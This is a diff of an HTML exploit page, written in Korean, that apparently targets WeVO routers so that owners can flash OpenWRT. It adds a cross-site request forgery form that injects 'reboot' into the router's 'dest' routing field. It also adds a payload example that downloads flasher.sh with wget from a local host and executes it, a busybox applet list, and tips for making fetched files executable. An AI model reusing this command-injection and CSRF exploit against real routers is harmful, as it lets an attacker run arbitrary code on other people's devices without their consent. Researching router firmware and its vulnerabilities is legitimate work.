@@ -1,19 +1,78 @@
 <html>
     <head>
-        <title>Hello, world!</title>
-        <link rel="stylesheet" href="https://unpkg.com/purecss@1.0.0/build/pure-min.css" integrity="sha384-nn4HPE8lTHyVtfCBi5yW9d20FjT8BJwUXyWZT9InLYax14RDjBj46LmSztkmNP9w" crossorigin="anonymous">
-        <script src="js/index.js"></script>
+        <title>Hello, CSRF!</title>
+        <link rel="stylesheet" href="css/pure-min.css">
         <link rel="stylesheet" href="css/index.css">
+        <script src="js/index.js"></script>
     </head>
     <body>
         <div class="container">
             <h2>Pre-flight checklist</h2>
             <ol>
+                <li>브라우저가 공유기 설정 페이지에 로그인 되어 있습니까?</li>
                 <li>익스플로잇을 실행하는 머신의 IP 주소가 192.168.10.2 로 설정되어 있습니까?</li>
                 <li>익스플로잇을 실행하는 머신의 8080 포트에 익스플로잇을 호스트하는 웹 서버가 가동 중입니까?</li>
                 <li>공유기의 LAN IP 주소가 192.168.10.1 이 맞습니까?</li>
             </ol>
+            <h2>주의사항</h2>
+            <p>
+                주입된 스크립트가 가동될 시스템은 WeVO 순정 펌웨어입니다. 이는 굉장히 제약된 Embedded Linux 환경이며, 이 환경에는 굉장히 많은 명령들이 존재하지 않습니다. 특히 일부 WeVO 시스템(Realtek 기반 일부 시스템)에서는 chmod 명령 또한 예외가 아닙니다. 스크립트 페이로드 작성 시 유의해 주십시오.<br>
+                팁: chmod 커멘드가 존재하지 않는 시스템에서 wget 이 받은 파일에 실행 권한을 부여하기 위해서는 cp /bin/busybox /tmp/foo 와 같이 실행 권한이 있는 파일을 복사해 온 뒤 해당 파일을 덮어쓰십시오
+            </p>
+            <p>
+                W2914NS v2 변종들에서 사용 가능한 Busybox applet 들
+                <blockquote>
+                    <pre>
+BusyBox v1.12.1 (2016-07-07 15:32:44 KST) multi-call binary
+Copyright (C) 1998-2008 Erik Andersen, Rob Landley, Denys Vlasenko
+and others. Licensed under GPLv2.
+See source distribution for full notice.
+
+Usage: busybox [function] [arguments]...
+   or: function [arguments]...
+
+        BusyBox is a multi-call binary that combines many common Unix
+        utilities into a single executable.  Most people will create a
+        link to busybox for each function they wish to use and BusyBox
+        will act like whatever it was invoked as!
+
+Currently defined functions:
+        [, [[, addgroup, adduser, arp, ash, awk, basename, brctl, cat,
+        chmod, chpasswd, cp, date, delgroup, deluser, df, dmesg, echo,
+        ether-wake, expr, fdisk, free, grep, halt, hexdump, hostname, id,
+        ifconfig, init, init, insmod, kill, killall, klogd, ln, logger,
+        login, logread, ls, lsmod, md5sum, mdev, mkdir, mknod, mount, mv,
+        ping, poweroff, ps, pwd, reboot, rm, rmmod, route, sed, seq, sh,
+        sleep, stty, sync, syslogd, telnetd, test, tftp, time, top, touch,
+        tr, udhcpc, udhcpd, umount, uptime, vconfig, wc, wget
+                    </pre>
+                </blockquote>
+            </p>
+            <h2>페이로드 예시</h2>
+            <ul>
+                <li>reboot - 공유기를 리붓시킵니다</li>
+                <li>cp /bin/busybox /tmp/extbin; wget -O /tmp/extbin http://192.168.10.2:8080/asset/flasher.sh; /tmp/extbin 192.168.10.2:8080 - asset/flasher.sh 를 이용, 공유기에 OpenWRT 를 설치합니다. (지원 기종: 11AC NAS Router, W2914NS v2, Hi1200AC)</li>
+            </ul>
+            <h2>Note</h2>
+            <ul>
+                <li>익스플로잇에 번들된 OpenWRT 펌웨어는 OpenWRT 18.06.1 공식 빌드입니다</li>
+                <li>익스플로잇에 번들된 U-Boot 이미지는 <a href="https://github.com/mqmaker/witi-uboot">https://github.com/mqmaker/witi-uboot</a> 를 사용하여 빌드되었습니다
+            </ul>
             <h2>Exploit!</h2>
+            <form action="http://192.168.10.1/cgi-bin/internet.cgi" method="post" target="posttarg" class="pure-form pure-form-aligned">
+                <fieldset>
+                    <legend>Let's reboot WeVO!</legend>
+                    <input type="hidden" name="dest" value="111.111.111.111; reboot; ">
+                    <input type="hidden" name="page" value="addrouting">
+                    <input type="hidden" name="hostnet" value="host">
+                    <input type="hidden" name="netmask" value="">
+                    <input type="hidden" name="gateway" value="111.111.111.111">
+                    <input type="hidden" name="interface" value="lan">
+                    <input type="hidden" name="custom_interface" value="">
+                    <input type="hidden" name="comment" value="foo">
+                    <button class="pure-button pure-button-primary">Reboot!</button>
+                </fieldset>
+            </form>
             <form action="http://0.0.0.0/cgi-bin/internet.cgi" method="post" id="exploiter" target="posttarg" class="pure-form pure-form-aligned">
                 <fieldset>
                     <legend>Let's install CFW on WeVO!</legend>
@@ -34,7 +93,7 @@
                     <input type="hidden" name="custom_interface" value="">
                     <input type="hidden" name="comment" value="foo">
                     <div class="pure-control-group" style="text-align: right;">
-                        <button type="button" class="pure-button pure-button-primary" id="romload" onclick="inject()">Execute!</button>
+                        <button type="button" class="pure-button pure-button-primary" onclick="inject()">Execute!</button>
                     </div>
                 </fieldset>
             </form>
